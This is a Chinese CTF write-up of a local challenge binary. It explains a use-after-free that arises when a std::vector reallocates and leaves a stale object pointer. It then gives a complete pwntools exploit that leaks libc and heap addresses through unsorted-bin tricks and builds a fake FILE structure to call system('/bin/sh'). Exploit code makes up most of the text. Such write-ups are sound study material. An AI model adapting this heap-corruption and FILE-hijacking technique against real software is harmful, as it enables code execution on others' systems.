
## 漏洞点分析

程序在`MsgHandler::handleCMD`函数中存在一个迭代器失效的问题，看到这段代码
```cpp
if ( cfgCmd->updated )
    {
      M_current = std::vector<Config *>::end(&this->vec_objs)._M_current;
      v4._M_current = std::vector<Config *>::begin(&this->vec_objs)._M_current;
      this->now_obj = std::find_if<__gnu_cxx::__normal_iterator<Config **,std::vector<Config *>>,MsgHandler::handleCMD(char *)::{lambda(Config *)#1}>(
                        v4,
                        (__gnu_cxx::__normal_iterator<Config**,std::vector<Config*> >)M_current,
                        (MsgHandler::handleCMD::<lambda(Config*)>)cfgCmd);
    }
```
可以看到，`now_obj`指针更新是由我们自己指定得。而程序提供了

 - cmdAdd
 - cmdDelete

这两种接口，利用这两点可以实现一种UAF场景：

 - vec_objs 初始大小为1
 - 往其中添加4个新对象，并且让now_obj指向第三个对象
 - 再添加一个对象，此时vec_objs会分配新的内存存放这些指针，而now_obj残留在原来得内存中
 - 删除第三个对象，此时now_obj仍然指向了被删除的内存区域，实现UAF


## exp利用编写

由于题目中不存在直接修改内存指针的方式，所以这里需要多次利用UAF来进行泄露和利用。当构成UAF得时候，内存布局如下
```
vec_objs:(free)   obj(free)             name and content (free)
+--------+       +-------------+      +----------+
|now_obj |------>| +8 name     | ---> | free name|
+--------+       | +10 content | +    +----------+
                 +-------------+ |    +-------------+
                                 +--> | free content|
                                      +-------------+
```

### 泄露地址
我们使用传统的堆泄露技巧。程序提供了`cmdVisit`接口，用于访问迭代器，此时通过堆布局，将name或者content放入unsortedbin中，同时合理的切割堆块，实现libc和堆地址

### 漏洞利用
利用的时候，这边使用的是打FILE的技巧，通过抢占`vec_objs(free)`的内存块，往`STDIN._chain`后方放入伪造的FILE，从而实现漏洞利用

exp如下

```python
from pwn import *


ph = process("./main")

context.log_level = "DEBUG"
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# gdb.attach(ph, "b msgHandler.hpp:126")
# gdb.attach(ph, "b visit_obj")

def new_cfg(op, name, content, updated):

    normal_cfg = b''
    normal_cfg += p32(op)
    normal_cfg += p32(len(name))
    normal_cfg += name
    # content
    normal_cfg += p32(len(content))
    normal_cfg += content
    normal_cfg += p8(updated)

    return normal_cfg

def config_leak_libc_unsorted():

    configs = []

    # update1
    name = b'A'*0x30
    content = b'A'*0x30
    configs.append(new_cfg(1, name, content, 1))

    # not update
    # modify:here could not be used
    name = b'B'*0x30
    content = b'B'*0x30
    configs.append(new_cfg(1, name, content, 1))

    # update to here
    name = b'C' * 0x30
    content = b'C' * 0x420
    configs.append(new_cfg(1, name, content, 1))

    # from here ,we will not update
    name = b'D' * 0x30
    content = b'D' * 0x420 
    configs.append(new_cfg(1, name, content, 0))

    # now it pointer to the older one
    # add new one to trigger vul
    name = b'E' * 0x30
    content = name 
    configs.append(new_cfg(1, name, content, 0))

    # delete first one
    name = b'C'*0x30
    # content = b'C'*0x30
    content = b''
    configs.append(new_cfg(3, name, content, 0))

    # here the C content is unsortedbin, now we try to leak content
    name = b''
    content = b'C'*0x6c0
    configs.append(new_cfg(4, name, content, 0))

    # here try to add tcache
    payload = b""
    # send to local handle
    payload += p32(1)
    payload += p32(0x41)
    payload += p32(len(configs))

    for each in configs:
        payload += each

    return payload



def config_leak_heap_unsorted():
    configs = []

    # update1
    name = b'F'*0x30
    content = b'F'*0x420
    configs.append(new_cfg(1, name, content, 1))

    name = b'G'*0x30
    content = b'G'*0x30
    configs.append(new_cfg(1, name, content, 0))

    name = b'H'*0x30
    content = b'H'*0x30
    configs.append(new_cfg(1, name, content, 0))

    name = b'I'*0x30
    content = b'I'*0x30
    configs.append(new_cfg(1, name, content, 0))

    name = b'J'*0x30
    content = b''
    configs.append(new_cfg(1, name, content, 0))

    name = b'F'*0x30
    content = b''
    configs.append(new_cfg(3, name, content, 0))


    # split block, leak again
    name = b''
    # content = b'C'*0x30
    content = b''
    configs.append(new_cfg(4, name, content, 0))

    # here try to add tcache
    payload = b""
    # send to local handle
    payload += p32(1)
    payload += p32(0x41)
    payload += p32(len(configs))

    for each in configs:
        payload += each

    return payload


def config_exploit_IO(libc, heap):
    _IO_list = libc + 0x1cb5a0 - 0x10
    _STDIN_chain = libc + 0x1ec980 + 0x68
    system_addr = libc+0x52290
    configs = []
    _IO_wfile_jumps = libc+0x1e8f60

    log.success("system address is " + hex(system_addr))
    log.success("_IO_wfile_jumps address is " + hex(_IO_wfile_jumps))
    another_heap = heap+0x12470
    name_heap = heap+0x12380
    # update1
    # malloc 0x48 size
    # prepare the FILE
    name = b'aaa'
    # prepare first heap
    content = b'a'*32+p64(_STDIN_chain-0x8)+b'a'*23
    configs.append(new_cfg(1, name, content, 0))

    # update it!
    name = b'/bin/sh\x00'+p64(0) + p64(0x10)+p64(system_addr)+p64(1)+p64(0x100)+p64(0)*14+p64(another_heap)+p64(0)+p64(0)+p64(0)+p64(1)+p64(0)+p64(0)+p64(_IO_wfile_jumps+0x30)
    content = p64(510)+p64(0)+p64(0)+p64(510)+p64(530)+p64(0)+p64(0)+p64(0)+p64(0)*20+p64(name_heap)
    configs.append(new_cfg(2, name, content, 0))

    # update the target
    # add another file ptr
    payload = b""
    payload += p32(1)
    payload += p32(0x41)
    payload += p32(len(configs))

    for each in configs:
        payload += each

    return payload

# leak
payload = config_leak_libc_unsorted()
ph.recvuntil("Enter command:")
ph.sendline(payload)
c1 = ph.recvuntil("Current Object Name:")
ph.recvuntil("Content: ")
libc_base = u64(ph.recvuntil("\n")[:-1].ljust(8,b'\x00'))
libc_base = libc_base-0x1ecbe0
log.success("libc:" + hex(libc_base))
ph.recvuntil("Enter command:")
payload = config_leak_heap_unsorted()
ph.sendline(payload)
c2 = ph.recvuntil("Current Object Name:")
ph.recvuntil("Content: ")
heap_base = u64(ph.recvuntil("\n")[:-1].ljust(8,b'\x00'))
heap_base = heap_base - 0x127f0
log.success("heap:" + hex(heap_base))

# pwn
payload = config_exploit_IO(libc_base, heap_base)
ph.recvuntil("Enter command:")
ph.sendline(payload)
# print *(_IO_FILE*)&_IO_2_1_stdin_ 
# trigger!
# ph.interactive()
ph.recvuntil("Enter command:")
ph.sendline(b"T")

ph.interactive()
```